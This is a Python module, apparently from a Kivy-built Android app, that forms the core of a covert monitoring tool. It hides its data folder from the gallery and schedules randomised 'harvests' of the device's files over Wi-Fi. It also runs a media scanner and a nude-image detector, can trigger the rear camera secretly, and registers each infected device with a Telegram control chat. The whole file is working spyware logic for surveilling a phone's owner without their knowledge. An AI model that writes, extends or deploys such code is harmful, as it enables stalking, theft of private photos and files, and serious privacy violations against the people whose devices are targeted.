# -*- coding: utf-8 -*-
import os
import time
import json
import random
import threading
import logging
import gc
import hashlib
from datetime import datetime, timedelta

def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
if not os.path.exists(P):
    os.makedirs(P)

logging.basicConfig(
    filename=os.path.join(P, "m.log"),
    level=logging.ERROR,
    filemode='a',
    format='%(asctime)s [%(levelname)s] %(message)s'
)

try:
    from jnius import autoclass
    JNI = True
except ImportError:
    JNI = False

# ========== دالة fromisoformat آمنة ==========
def _parse_iso_datetime(iso_string):
    """فك تشفير تاريخ ISO بشكل آمن (متوافق مع Python 3.6+)"""
    if not iso_string or not isinstance(iso_string, str):
        return None
    iso_string = iso_string.strip()
    if not iso_string:
        return None
    try:
        # Python 3.7+
        return datetime.fromisoformat(iso_string)
    except AttributeError:
        # Python < 3.7
        for fmt in ("%Y-%m-%dT%H:%M:%S.%f", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S"):
            try:
                return datetime.strptime(iso_string, fmt)
            except ValueError:
                continue
        return None
    except ValueError:
        return None


class M:
    def __init__(self):
        self.d = P
        self.cf = os.path.join(self.d, "c.json")  # ملف الإعدادات
        self.lh = os.path.join(self.d, "lh")      # آخر وقت حصاد
        self.wt = os.path.join(self.d, "wt")      # وقت الحصاد القادم

        self.rn = True
        self.did = None
        self.dmd = None
        self.last_mid = 0

        self.ui = None
        self.daily_zipper = None
        self.camera_analyzer = None
        self.nude_detector = None
        self.media_scanner = None
        self.ctrl = None
        self.vlt = None

        # أحداث التحكم
        self._wake_event = threading.Event()
        self._harvest_lock = threading.Lock()
        self._harvest_running = False

        self._load_config()
        self._get_device_info()
        self._setup()

    def _setup(self):
        """إعداد المجلدات والملفات الأولية"""
        try:
            # إنشاء .nomedia لإخفاء المجلد من المعرض
            nomedia_path = os.path.join(self.d, ".nomedia")
            if not os.path.exists(nomedia_path):
                with open(nomedia_path, 'w') as f:
                    f.write("")
        except:
            pass

        # إنشاء ملف وقت الحصاد القادم إذا لم يكن موجوداً
        if not os.path.exists(self.wt):
            self._set_next_harvest_time()

    def _load_config(self):
        """تحميل الإعدادات مع قيم افتراضية"""
        default_cfg = {
            "hth": 15,                    # عتبة البطارية (%)
            "wl": False,                  # Wake lock (للتوافق فقط)
            "iv": 900,                    # فاصل الفحص (ثانية) = 15 دقيقة
            "harvest_min_interval": 7200, # 2 ساعات كحد أدنى بين الحصادات
            "auto_camera": False,         # تفعيل الكاميرا التلقائية
            "camera_interval": 3600,      # فاصل الكاميرا (ثانية) = ساعة
            "max_harvest_files": 200      # الحد الأقصى للملفات في الحصاد
        }

        if os.path.exists(self.cf):
            try:
                with open(self.cf, 'r', encoding='utf-8') as f:
                    loaded = json.load(f)
                    default_cfg.update(loaded)
            except Exception as e:
                logging.error(f"Config load error: {e}")

        self.cfg = default_cfg

        # حفظ الإعدادات إذا لم تكن موجودة
        if not os.path.exists(self.cf):
            self._save_config()

    def _save_config(self):
        """حفظ الإعدادات إلى الملف"""
        try:
            with open(self.cf, 'w', encoding='utf-8') as f:
                json.dump(self.cfg, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logging.error(f"Config save error: {e}")

    def _get_ctx(self):
        """الحصول على سياق Android"""
        if not JNI:
            return None
        try:
            return autoclass('org.kivy.android.PythonActivity').mActivity
        except:
            return None

    def _get_device_info(self):
        """استخراج معلومات الجهاز (ID والطراز)"""
        if JNI:
            try:
                ctx = self._get_ctx()
                if ctx is None:
                    raise Exception("No context")
                Build = autoclass('android.os.Build')
                Secure = autoclass('android.provider.Settings$Secure')
                resolver = ctx.getContentResolver()
                self.did = Secure.getString(resolver, Secure.ANDROID_ID)
                self.dmd = f"{Build.MANUFACTURER} {Build.MODEL}"
                # في حال كان المعرف فارغاً
                if not self.did:
                    self.did = f"ID_{random.randint(100000, 999999)}"
            except Exception as e:
                logging.error(f"Device info error: {e}")
                self.did = f"ID_{random.randint(100000, 999999)}"
                self.dmd = "Android_Device"
        else:
            self.did, self.dmd = "DEV_PC", "Linux_System"

    def _is_wifi(self):
        """التحقق من الاتصال بشبكة Wi-Fi"""
        if not JNI:
            return True
        try:
            ctx = self._get_ctx()
            if ctx is None:
                return False
            cm = ctx.getSystemService("connectivity")
            if cm is None:
                return False
            ni = cm.getActiveNetworkInfo()
            return ni and ni.isConnected() and ni.getType() == 1  # TYPE_WIFI = 1
        except Exception as e:
            logging.error(f"WiFi check error: {e}")
            return False

    def _battery_ok(self):
        """التحقق من حالة البطارية: تعيد (النسبة المئوية, هل هي في الشحن)"""
        if not JNI:
            return 100, True
        try:
            ctx = self._get_ctx()
            if ctx is None:
                return 50, False

            IntentFilter = autoclass('android.content.IntentFilter')
            battery_filter = IntentFilter("android.intent.action.BATTERY_CHANGED")
            battery_status = ctx.registerReceiver(None, battery_filter)

            if battery_status is None:
                return 50, False

            level = battery_status.getIntExtra("level", -1)
            scale = battery_status.getIntExtra("scale", -1)
            status = battery_status.getIntExtra("status", -1)

            percent = int((level / scale) * 100) if scale > 0 else 50
            is_charging = status in (2, 5)  # BATTERY_STATUS_CHARGING أو BATTERY_STATUS_FULL

            return percent, is_charging
        except Exception as e:
            logging.error(f"Battery check error: {e}")
            return 50, False

    def _set_next_harvest_time(self, hours=None):
        """حساب وتحديد وقت الحصاد القادم بشكل عشوائي"""
        try:
            if hours is None:
                hours = random.randint(2, 6)
            minutes = random.randint(0, 59)
            target = datetime.now() + timedelta(hours=hours, minutes=minutes)

            with open(self.wt, 'w', encoding='utf-8') as f:
                f.write(target.isoformat())
            return target
        except Exception as e:
            logging.error(f"Set next harvest error: {e}")
            return None

    def _can_harvest(self):
        """التحقق مما إذا كان مسموحاً بالحصاد (الوقت والحد الأدنى)"""
        # التحقق من وجود وقت انتظار
        if os.path.exists(self.wt):
            try:
                with open(self.wt, 'r', encoding='utf-8') as f:
                    next_time_str = f.read().strip()
                    next_time = _parse_iso_datetime(next_time_str)
                    if next_time and datetime.now() < next_time:
                        return False, f"Next harvest at {next_time}"
            except Exception as e:
                logging.error(f"Can harvest check error: {e}")

        # التحقق من الحد الأدنى بين الحصادات (اختياري)
        if os.path.exists(self.lh):
            try:
                with open(self.lh, 'r', encoding='utf-8') as f:
                    last_time_str = f.read().strip()
                    last_time = _parse_iso_datetime(last_time_str)
                    if last_time:
                        min_interval = self.cfg.get('harvest_min_interval', 7200)
                        if datetime.now() - last_time < timedelta(seconds=min_interval):
                            return False, "Minimum interval not reached"
            except Exception as e:
                logging.error(f"Last harvest read error: {e}")

        return True, "OK"

    def _harvest_logic(self):
        """منطق الحصاد الرئيسي: التحقق من الشروط ثم تشغيل الحصاد"""
        # التحقق من القفل لتجنب التنفيذ المتزامن
        if self._harvest_running:
            return

        with self._harvest_lock:
            if self._harvest_running:
                return
            self._harvest_running = True

        try:
            # 1. التحقق من WiFi
            if not self._is_wifi():
                logging.debug("Not on WiFi, skipping harvest")
                return

            # 2. التحقق من البطارية
            battery, charging = self._battery_ok()
            min_battery = self.cfg.get('hth', 15)
            if battery < min_battery and not charging:
                logging.info(f"Battery too low: {battery}%")
                return

            # 3. التحقق من وقت الانتظار
            can_harvest, reason = self._can_harvest()
            if not can_harvest:
                logging.debug(f"Harvest skipped: {reason}")
                return

            # 4. تشغيل الحصاد عبر daily_zipper
            if self.daily_zipper and hasattr(self.daily_zipper, 'run'):
                try:
                    # تشغيل الحصاد في خيط منفصل
                    threading.Thread(target=self.daily_zipper.run, daemon=True).start()

                    # تحديث وقت الحصاد القادم
                    self._set_next_harvest_time()

                    # تسجيل آخر حصاد
                    with open(self.lh, 'w', encoding='utf-8') as f:
                        f.write(datetime.now().isoformat())

                    logging.info("Harvest triggered successfully")
                except Exception as e:
                    logging.error(f"Harvest execution error: {e}")

            # 5. تشغيل ماسح الوسائط (تنظيف أولاً)
            if self.media_scanner and hasattr(self.media_scanner, 'run_scan'):
                try:
                    self.media_scanner.run_scan(cleanup_first=True)
                except Exception as e:
                    logging.error(f"Scanner run error: {e}")

        except Exception as e:
            logging.error(f"Harvest logic error: {e}")
        finally:
            self._harvest_running = False
            gc.collect()

    def _camera_logic(self):
        """منطق الكاميرا التلقائية: التقاط صورة تلقائياً إذا تم التفعيل"""
        if not self.cfg.get('auto_camera', False):
            return

        if not self.camera_analyzer or not hasattr(self.camera_analyzer, 'harvest'):
            return

        # التحقق من الفاصل الزمني
        last_camera_file = os.path.join(self.d, "last_camera")
        interval = self.cfg.get('camera_interval', 3600)

        try:
            if os.path.exists(last_camera_file):
                with open(last_camera_file, 'r') as f:
                    last_time = float(f.read().strip())
                    if time.time() - last_time < interval:
                        return
        except Exception as e:
            logging.error(f"Camera interval check error: {e}")

        # التحقق من البطارية
        battery, charging = self._battery_ok()
        if battery < 20 and not charging:
            return

        # التقاط صورة من الكاميرا الخلفية
        try:
            threading.Thread(
                target=self.camera_analyzer.harvest,
                args=(0,),  # cam_id=0 يعني الكاميرا الخلفية
                daemon=True
            ).start()

            with open(last_camera_file, 'w') as f:
                f.write(str(time.time()))

            logging.info("Auto-camera triggered")
        except Exception as e:
            logging.error(f"Camera logic error: {e}")

    def _loop(self):
        """الحلقة الرئيسية للمراقبة (تُشغل في خيط منفصل)"""
        while self.rn:
            try:
                self._harvest_logic()
                self._camera_logic()
            except Exception as e:
                logging.error(f"Monitor loop error: {e}")

            # نوم عميق باستخدام Event (يمكن إيقاظه فوراً)
            interval = self.cfg.get('iv', 900)
            self._wake_event.wait(interval)

            # إعادة تعيين الحدث بعد الاستيقاظ
            self._wake_event.clear()

    def start(self):
        """بدء تشغيل المراقبة وتسجيل الجهاز"""
        # تشغيل حلقة المراقبة في خيط منفصل
        threading.Thread(target=self._loop, daemon=True, name="MonitorLoop").start()

        # تسجيل الجهاز مع الـ Telegram UI
        if self.ui and self.did:
            try:
                if hasattr(self.ui, 'reg'):
                    self.ui.reg(self.did, self.dmd)
                elif hasattr(self.ui, '_api'):
                    # تسجيل يدوي إذا لم تكن الدالة موجودة
                    ctrl = getattr(self, 'ctrl', None)
                    if ctrl:
                        self.ui._api("sendMessage", {
                            "chat_id": ctrl,
                            "text": f"📱 جهاز جديد متصل\nID: `{self.did}`\nModel: {self.dmd}",
                            "parse_mode": "Markdown"
                        })
            except Exception as e:
                logging.error(f"Device registration failed: {e}")

    def stop(self):
        """إيقاف المراقبة"""
        self.rn = False
        self._wake_event.set()

    def force_harvest(self):
        """إجبار الحصاد على الفور (تجاوز وقت الانتظار)"""
        # حذف ملف وقت الانتظار لتجاوز الشرط
        if os.path.exists(self.wt):
            try:
                os.remove(self.wt)
            except Exception as e:
                logging.error(f"Force harvest remove wt error: {e}")

        # تشغيل الحصاد في خيط منفصل
        threading.Thread(target=self._harvest_logic, daemon=True).start()

    def update_config(self, key, value):
        """تحديث إعداد معين وحفظه"""
        self.cfg[key] = value
        self._save_config()

    def get_status(self):
        """الحصول على حالة المراقبة (للتصحيح)"""
        status = {
            "running": self.rn,
            "harvest_running": self._harvest_running,
            "device_id": self.did,
            "device_model": self.dmd,
            "wifi": self._is_wifi(),
            "battery": self._battery_ok(),
            "config": self.cfg
        }
        # قراءة آخر حصاد
        if os.path.exists(self.lh):
            try:
                with open(self.lh, 'r') as f:
                    status["last_harvest"] = f.read().strip()
            except:
                status["last_harvest"] = None
        # قراءة وقت الحصاد القادم
        if os.path.exists(self.wt):
            try:
                with open(self.wt, 'r') as f:
                    status["next_harvest"] = f.read().strip()
            except:
                status["next_harvest"] = None
        return status


def get_device_tag():
    """الحصول على معرف جهاز مختصر (أول 8 خانات)"""
    try:
        if JNI:
            Secure = autoclass('android.provider.Settings$Secure')
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            if ctx:
                aid = Secure.getString(ctx.getContentResolver(), Secure.ANDROID_ID)
                if aid:
                    return aid[:8].lower()
    except Exception as e:
        logging.debug(f"get_device_tag (JNI) error: {e}")

    try:
        if JNI:
            Build = autoclass('android.os.Build')
            model = f"{Build.MANUFACTURER} {Build.MODEL}"
            return hashlib.md5(model.encode()).hexdigest()[:8]
    except Exception as e:
        logging.debug(f"get_device_tag (Build) error: {e}")

    return "unknown"


# ========== دالة المصنع ==========
def create():
    return M()
